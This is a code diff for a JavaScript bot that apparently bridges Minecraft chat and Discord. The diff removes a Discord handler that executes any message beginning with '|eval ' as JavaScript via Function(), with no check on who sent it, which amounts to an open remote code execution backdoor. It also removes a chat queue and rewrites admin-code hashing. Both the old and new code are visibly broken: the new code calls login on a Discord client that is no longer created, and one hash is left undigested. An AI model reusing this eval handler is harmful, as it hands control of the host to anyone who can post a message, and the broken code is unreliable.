@@ -47,34 +47,21 @@ global.csl=[
 ["&9","&f"],["&a","&f"],["&a","&b"],["&b","&f"],["&c","&f"],["&d","&f"],
 ["&e","&f"],["&f","&f"],["",""]
 ][conf.cs]
-if(conf.reversecs){csl=csl.reverse()}
+if(conf.inverseColor){csl=csl.reverse()}
 global.adminCode = 0;
-var mrn = function(offset,range,base){
-	return Math.floor(Math.random()*range).toString(base)			
-}
-global.clientd = new Discord.Client();
-global.clientd.on('message', msg => {
-  if (msg.content.startsWith("|eval ")) {
-    try{msg.reply(Function("return (function(){"+msg.content.slice(6)+"})()")()).catch(function(t){});}
-	catch(ErrorD1a){msg.reply("Error: "+ErrorD1a)}
-  }
-});
+var mrn = function(offset,range,base){return Math.floor(Math.random()*range).toString(base)			}
 global.clientd.login(conf.token);
 var mrr = function(){	var rn = +mrn(2,32,10);	return (mrn(2,rn,rn))};var ran=function(){	return mrn()+mrn()+mrn()+mrn()+mrn()+mrn()+mrn()+mrn()+mrn()+mrn()+mrn()+mrn()+mrn()+mrn()+mrn()+mrn()}
-global.confirm=function(){	confirmQueueMove(adminCode);};setTimeout(function(){global.cl=setInterval(chatLogQueueMove,conf.chatLogQueueSpeed)},5000);setTimeout(function(){global.bc=setInterval(chatQueueMove,conf.botChatQueueSpeed)},5000);setTimeout(function(){global.cd=setInterval(cmdQueueMove,conf.commandQueueSpeed)},1000);setTimeout(function(){global.discq=setInterval(dcqm,1500)},4000)
+global.confirm=function(){	confirmQueueMove(adminCode);};setTimeout(function(){global.cl=setInterval(chatLogQueueMove,conf.chatLogQueueSpeed)},5000);setTimeout(function(){global.bc=setInterval(chatQueueMove,conf.botChatQueueSpeed)},5000);setTimeout(function(){global.cd=setInterval(cmdQueueMove,conf.commandQueueSpeed)},1000);
 global.chatQueueR=function(t){
 	clearInterval(bc);//bc
 	setTimeout(function(){bc=setInterval(chatQueueMove,+t)},100)
 	cwc("Chat speed set to "+t+"ms.")
 }
 var rh=function(){
-var hash = crypto.createHash('sha512').update(ran()+mrn(0,100,10)+ran()+mrn(0,100,10)+ran()+mrn(0,1000,10)+Date.now()+"").digest('hex');
-var hash2 = crypto.createHash('sha512').update(ran()+mrn(0,100,11)+ran()+mrn(0,10000,20)+ran()+mrn(0,20000,10)+(Date.now()+2000)+"\u001c").digest('hex');
-var hash3 = crypto.createHash('sha512').update(ran()+mrn(0,100,12)+ran()+mrn(0,1000000,30)+ran()+mrn(0,300000,10)+(Date.now()+4000)+"\u001d").digest('hex');
-
-hash;
-hash2;
-hash3var h1=hash.digest('hex');var h2=hash2.digest('hex');var h3=hash3.digest('hex')
+var h1 = crypto.createHash('sha512').update(ran()+mrn(0,100,10)+ran()+mrn(0,100,10)+ran()+mrn(0,1000,10)+Date.now()+"").digest('hex');
+var h2 = crypto.createHash('sha512').update(ran()+mrn(0,100,11)+ran()+mrn(0,10000,20)+ran()+mrn(0,20000,10)+(Date.now()+2000)+"\u001c").digest('hex');
+var h3 = crypto.createHash('sha512').update(ran()+mrn(0,100,12)+ran()+mrn(0,1000000,30)+ran()+mrn(0,300000,10)+(Date.now()+4000)+"\u001d");
 global.adminCode = h1+h2+h3
 }
 setTimeout(rh,800);
@@ -356,7 +343,6 @@ client.on('chat', function(packet) {
 	var processed = lang.tth(jsonMsg)[0];
 	var fileprocessed = lang.tth(jsonMsg)[1];
 	var ir = lang.tth(jsonMsg)[2];
-	discordChatQueue.push(ir)
 	var preText = ir.split(": ");
 	var pt2 = preText[0]
 	var preTextFirst = preText.shift();
